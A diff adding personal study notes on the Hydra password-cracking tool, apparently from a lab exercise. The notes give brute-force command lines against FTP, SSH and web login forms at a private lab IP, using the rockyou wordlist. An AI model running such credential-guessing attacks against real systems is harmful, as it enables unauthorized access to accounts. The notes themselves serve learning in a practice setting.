@@ -1,0 +1,45 @@
+-------------------HYDRA-------------------------
+1. to find any file
+find / -type f -name "rockyou.txt" 2>/dev/null
+
+
+Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.
+
+DIFFERENT PROTOCOLS = DIFFERETN SYNTAX
+
+1. FTP:
+hydra -l user -P passlist.txt ftp://10.49.191.197
+where user - username
+passlist.txt - the path and list name
+ftp - the protocol used 
+://ip - the target ip
+
+2. SSH
+hydra -l <username> -P <full path to pass> 10.49.191.197 -t 4 ssh
+
+In Hydra, “threads to spawn” simply means how many login attempts Hydra will try at the same time.
+
+
+3. Post Web Form
+sudo hydra <username> <wordlist> 10.49.191.197 http-post-form "<path>:<login_credentials>:<invalid_response>"
+
+Option				Description
+-l			the username for (web form) login
+-P			the password list to use
+http-post-form		the type of the form is POST
+<path>			the login page URL, for example, login.php (http-post-form "/login:username^USER^&password=^PASS^:f=incorrect")
+<login_credentials>	the username and password used to log in, for example, username=^USER^&password=^PASS^
+<invalid_response>	part of the response when the login fails
+-V			verbose output for every attempt
+
+
+hydra -l <username> -P <wordlist> 10.49.191.197 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
+The login page is only /, i.e., the main IP address.
+The username is the form field where the username is entered
+The specified username(s) will replace ^USER^
+The password is the form field where the password is entered
+The provided passwords will be replacing ^PASS^
+Finally, F=incorrect is a string that appears in the server reply when the login fails
+
+
